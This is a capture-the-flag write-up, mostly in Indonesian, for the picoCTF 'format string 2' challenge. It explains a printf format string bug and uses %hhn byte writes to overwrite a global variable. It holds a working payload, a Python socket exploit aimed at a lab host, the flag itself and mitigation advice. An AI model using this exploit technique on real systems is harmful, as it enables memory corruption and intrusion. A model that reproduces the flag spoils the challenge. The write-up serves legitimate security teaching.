# 448 - format string 2 (Binary Exploitation, picoCTF 2024, Medium)

## Challenge Metadata
- ID: 448 | Event: picoCTF 2024 | Author: Mubarak Mikail
- Category: Binary Exploitation / Arbitrary Memory Write | Difficulty: Medium (2) | Points: 200
- Flag: `academy{f0rm47_57r?_f0rm47_m3m_1c092a1e}`

---

## Problem Statement & Scope
Diberikan berkas biner ELF 64-bit non-PIE (`vuln`) dan kode sumber C (`vuln.c`). Program meminta masukan string dari pengguna menggunakan `scanf("%1024s", buf)` dan langsung mencetaknya ke konsol tanpa format penentu (*format specifier*):
```c
printf("Here's your input: ");
printf(buf);
```
Setelah pencetakan masukan, program mengevaluasi nilai variabel global `sus`:
```c
if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);
    printf("%s", flag);
}
```
Nilai awal variabel `sus` diinisialisasi sebagai `0x21737573` (representasi ASCII `!sus`). Peserta ditugaskan untuk memanipulasi memori proses secara arbitrer agar nilai variabel `sus` berubah tepat menjadi `0x67616c66` (representasi ASCII `galf` dalam little-endian, membentuk kata `"flag"`).

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Uncontrolled Format String Vulnerability (CWE-134):**
   Fungsi famili `printf` di bahasa C menerima format string sebagai argumen pertama yang menentukan bagaimana argumen berikutnya di stack/register diinterpretasikan. Ketika string yang dikendalikan pengguna diberikan langsung sebagai format string (`printf(buf)`), pengguna dapat menyisipkan format penentu seperti `%p`, `%x`, `%s`, dan `%n`.

2. **Mekanisme Penulisan Memori Arbitrer via `%n` / `%hhn`:**
   Spesifikasi bahasa C mendefinisikan penentu konversi `%n` yang tidak mencetak data, melainkan menuliskan jumlah total karakter yang telah dicetak oleh panggilan `printf` saat ini ke alamat integer yang ditunjuk oleh argumen yang bersangkutan:
   - `%n`: Menuliskan integer 32-bit (4 byte).
   - `%hn`: Menuliskan integer 16-bit (2 byte / half-word).
   - `%hhn`: Menuliskan integer 8-bit (1 byte / single byte).
   Dengan memanfaatkan `%hhn`, penyerang dapat menuliskan nilai byte per byte tanpa harus memicu overflow buffer atau mencetak miliaran karakter ke konsol.

3. **Arsitektur Pemanggilan Fungsi ABI x86-64 (AMD64 System V):**
   Pada arsitektur 64-bit Linux:
   - Argumen fungsi ke-1 sampai ke-6 diteruskan melalui register: `rdi` (format string), `rsi`, `rdx`, `rcx`, `r8`, `r9`.
   - Argumen ke-7 dan seterusnya diletakkan pada stack proses.
   - Variabel lokal `buf` yang dialokasikan di stack `main()` dapat diakses melalui argumen stack. Melalui pemindaian positional format specifier (`%k$p`), ditemukan bahwa pangkal array `buf` berada tepat pada argumen posisi ke-14 (`%14$p`).

4. **Ketiadaan Proteksi PIE (Position Independent Executable):**
   Pemeriksaan biner menggunakan `readelf -l vuln` dan `file vuln`:
   ```text
   ELF 64-bit LSB executable, x86-64, not stripped
   Base address: 0x400000
   ```
   Karena biner dikompilasi tanpa PIE (*No PIE*), alamat segmen `.data` dan simbol global bersifat statis dan deterministik. Simbol `sus` dapat ditemukan melalui `nm vuln | grep sus`:
   ```text
   0000000000404048 D sus
   ```
   Alamat memori `sus` adalah `0x404048`.

---

## Metodologi Pengujian NIST SP 800-115
Berdasarkan standar NIST SP 800-115 (*Technical Guide to Information Security Testing and Assessment*):

1. **Fase Perencanaan & Penemuan (Planning & Discovery):**
   - Menelaah kode sumber C (`vuln.c`) dan biner ELF x86-64.
   - Mengidentifikasi kelemahan format string pada `printf(buf)` dan kondisi target pada variabel `sus == 0x67616c66`.
   - Menemukan ketiadaan proteksi ASLR biner (*No PIE*) dan mengekstrak alamat statis `&sus = 0x404048`.
2. **Fase Analisis Kerentanan (Vulnerability Analysis):**
   - Melakukan probing stack menggunakan urutan `%1$p.%2$p...%20$p` untuk memetakan jarak offset antara register dan stack pointer.
   - Mengonfirmasi bahwa argumen ke-14 bertepatan dengan 8 byte pertama dari buffer pengguna `buf`.
   - Menguraikan nilai target `0x67616c66` menjadi 4 byte individual:
     - Byte 0 (`0x404048`): `0x66` (desimal 102)
     - Byte 1 (`0x404049`): `0x6c` (desimal 108)
     - Byte 2 (`0x40404a`): `0x61` (desimal 97)
     - Byte 3 (`0x40404b`): `0x67` (desimal 103)
3. **Fase Eksploitasi & Verifikasi (Attack Execution & Verification):**
   - Mengurutkan penulisan byte dari nilai terkecil ke terbesar secara monoton:
     1. Tulis 97 karakter ke alamat `0x40404a` (byte ke-2).
     2. Tambah $102 - 97 = 5$ karakter, tulis ke alamat `0x404048` (byte ke-0).
     3. Tambah $103 - 102 = 1$ karakter, tulis ke alamat `0x40404b` (byte ke-3).
     4. Tambah $108 - 103 = 5$ karakter, tulis ke alamat `0x404049` (byte ke-1).
   - Memasukkan format specifiers dan melakukan padding hingga kelipatan 8 byte ($K=6$ quadword = 48 byte).
   - Menyematkan 4 alamat target pada quadword setelah format string sehingga argumen ke-20, 21, 22, dan 23 menunjuk ke alamat target masing-masing.
   - Menjalankan payload terhadap lab on-demand, memvalidasi keberhasilan modifikasi memori `sus`, dan menangkap flag resmi.
4. **Fase Remediasi & Mitigasi (Remediation):**
   - Merumuskan rekomendasi perbaikan penulisan kode sumber dan pengerasan opsi kompilasi biner.

---

## Rekonstruksi Eksploitasi Step-by-Step
1. **Analisis Disassembly & Alamat Target:**
   Periksa simbol biner menggunakan utilitas GNU `nm` atau `objdump`:
   ```bash
   nm vuln | grep sus
   # 0000000000404048 D sus
   ```
2. **Penentuan Posisi Argumen Stack:**
   Kirimkan string uji `AAAA.%14$p`:
   ```text
   Here's your input: AAAA.0x2431252e41414141
   ```
   Nilai heksadesimal `0x41414141` (`AAAA`) muncul di argumen ke-14, membuktikan bahwa awal array `buf` diposisikan pada indeks argumen 14.
3. **Penyusunan Format String Payload:**
   Format string awal:
   ```text
   %97c%20$hhn%5c%21$hhn%1c%22$hhn%5c%23$hhn
   ```
   Panjang format string di atas adalah 41 karakter. Tambahkan 7 karakter padding `'A'` sehingga panjangnya menjadi tepat 48 byte (6 blok quadword 64-bit).
   Dengan panjang 6 quadword, alamat target akan menempati:
   - Quadword ke-7 (argumen $14 + 6 = 20$): `0x0040404A`
   - Quadword ke-8 (argumen $14 + 7 = 21$): `0x00404048`
   - Quadword ke-9 (argumen $14 + 8 = 22$): `0x0040404B`
   - Quadword ke-10 (argumen $14 + 9 = 23$): `0x00404049`
4. **Transmisi Payload ke Layanan Netcat:**
   Mengirimkan payload binary terkemas ke target lab instance:
   ```text
   You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
   Here's your input: ...
   I have NO clue how you did that, you must be a wizard. Here you go...
   academy{f0rm47_57r?_f0rm47_m3m_1c092a1e}
   ```

---

## Script Reproduksi & PoC
Implementasi otomasi mandiri tersedia di `scripts/solve_448_format_string_2.py`:
```python
import socket
import struct
import re
import time

HOST = "chatelaine.cylabacademy.net"
PORT = 14016

s = socket.create_connection((HOST, PORT), timeout=10)
time.sleep(0.3)
s.recv(4096)

K = 6
a1, a2, a3, a4 = 14 + K, 14 + K + 1, 14 + K + 2, 14 + K + 3
fmt = f"%97c%{a1}$hhn%5c%{a2}$hhn%1c%{a3}$hhn%5c%{a4}$hhn"
pad = K * 8 - len(fmt)
fmt_padded = fmt + "A" * pad
addrs = struct.pack("<QQQQ", 0x40404A, 0x404048, 0x40404B, 0x404049)
payload = fmt_padded.encode() + addrs

s.sendall(payload + b"\n")
time.sleep(0.5)

resp = s.recv(4096).decode(errors="ignore")
s.close()

flag = re.search(r"academy\{[^}]+\}", resp).group(0)
print("Flag:", flag)
```

---

## Flag & Verifikasi
- **Flag Resmi:** `academy{f0rm47_57r?_f0rm47_m3m_1c092a1e}`
- **Metode Verifikasi:**
  HTTP POST `/api/submissions/` dengan payload JSON:
  ```json
  {"challenge": 448, "flag": "academy{f0rm47_57r?_f0rm47_m3m_1c092a1e}"}
  ```
  Respons platform: `HTTP 201 Created` dengan `{"correct": true}`.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif
1. **Bahaya Pemanggilan Format String Tak Tersanitasi (CWE-134):**
   Tidak pernah melewatkan string masukan pengguna secara langsung sebagai parameter format ke fungsi famili `printf`. Penyerang tidak hanya dapat membaca memori sensitif (*information leakage*), namun juga dapat menuliskan nilai arbitrer ke pointer manapun di memori proses via penentu `%n`.
2. **Remediasi Kode Sumber:**
   Gunakan format specifier statis:
   ```c
   // RENTAN:
   printf(buf);

   // AMAN:
   printf("%s", buf);
   // ATAU:
   fputs(buf, stdout);
   ```
3. **Pengerasan Kompiler & Proteksi Biner Modern:**
   - **Aktifkan Compiler Warning & Errors:** Kompilasi dengan `-Wformat -Wformat-security -Werror=format-security` agar GCC/Clang menolak kompilasi kode yang memanggil format string tak statis.
   - **Position Independent Executable (PIE):** Aktifkan PIE (`-fPIE -pie`) sehingga lokasi data global teracak oleh ASLR dan penyerang tidak dapat menentukan alamat target secara deterministik.
   - **Full RELRO:** Aktifkan Full RELRO (`-Wl,-z,relro,-z,now`) agar tabel relokasi seperti GOT (*Global Offset Table*) bersifat *read-only* setelah proses dimuat.
